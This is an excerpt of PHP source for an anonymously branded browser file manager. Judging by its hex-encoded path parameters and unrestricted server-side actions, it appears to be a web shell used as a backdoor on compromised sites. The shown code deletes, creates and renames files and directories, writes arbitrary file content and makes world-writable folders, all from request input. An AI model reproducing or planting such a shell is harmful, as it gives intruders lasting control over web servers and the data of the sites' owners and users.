...
class Elliottophellia
{
    ...
    private function showHeader(): void
    {
        ...
        <head>
            ...
            <title>XIXIXIXIIX v' . VERSION . '</title>
        ...
        <body>
            <header>
                <h1 class="title">XIXIXIXIXIXIXI</h1>
...
private function removeFile(string $file): void
{
    if (unlink($file)) {
        echo '<dialog id="successModal" class="modal success">
                <p>File ' . htmlspecialchars($file) . ' Deleted Successfully!</p>
        ...
        echo '<dialog id="errorModal" class="modal error">
                <p>Failed to delete file ' . htmlspecialchars($file) . '.</p>
                <button onclick="this.closest(\'dialog\').close(); window.location.href = \'' . $this->selfFile . '?d=' . stringToHex($this->currentPath) . '\'">Close</button>
              </dialog>';
...
private function removeDirectory(string $dir): void
{
    if (rmdir($dir)) {
        echo '<dialog id="successModal" class="modal success">
                <p>Directory ' . htmlspecialchars($dir) . ' Deleted Successfully!</p>
                <button onclick="this.closest(\'dialog\').close(); window.location.href = \'' . $this->selfFile . '?d=' . stringToHex($this->currentPath) . '\'">Close</button>
              </dialog>';
        echo '<script>document.getElementById("successModal").showModal();</script>';
    } else {
...
private function createFile(string $fileName, string $fileContent = ''): void
{
    ...
    if (file_put_contents($fullPath, $fileContent) !== false) {
        echo '<dialog id="successModal" class="modal success">
                <p>File ' . htmlspecialchars($fileName) . ' Created Successfully!</p>
                <button onclick="this.closest(\'dialog\').close(); window.location.href = \'' . $this->selfFile . '?d=' . stringToHex($this->currentPath) . '\'">Close</button>
              </dialog>';
        echo '<script>document.getElementById("successModal").showModal();</script>';
    } else {
        echo '<dialog id="errorModal" class="modal error">
                <p>Failed to create file ' . htmlspecialchars($fileName) . '.</p>
...
private function createDirectory(string $dir): void
{
    if (mkdir($this->currentPath . "/" . $dir, 0777, true)) {
        echo '<dialog id="successModal" class="modal success">
                <p>Directory ' . htmlspecialchars($dir) . ' Created Successfully!</p>
                <button onclick="this.closest(\'dialog\').close(); window.location.href = \'' . $this->selfFile . '?d=' . stringToHex($this->currentPath) . '\'">Close</button>
              </dialog>';
        echo '<script>document.getElementById("successModal").showModal();</script>';
    } else {
        echo '<dialog id="errorModal" class="modal error">
                <p>Failed to create directory ' . htmlspecialchars($dir) . '.</p>
                <button onclick="this.closest(\'dialog\').close(); window.location.href = \'' . $this->selfFile . '?d=' . stringToHex($this->currentPath) . '\'">Close</button>
              </dialog>';
        echo '<script>document.getElementById("errorModal").showModal();</script>';
    }
...
{
    echo '<section class="tool-section">
            <h2>Rename File: ' . htmlspecialchars(hexToString($this->get['oldname'])) . '</h2>
            <form method="post" action="">
                <input type="text" name="oldname" value="' . htmlspecialchars(hexToString($this->get['oldname'])) . '" style="display: none;" readonly>
    ...
    if (isset($this->post['oldname']) && isset($this->post['newname'])) {
        if (rename($this->post['oldname'], $this->post['newname'])) {
            echo '<dialog id="successModal" class="modal success">
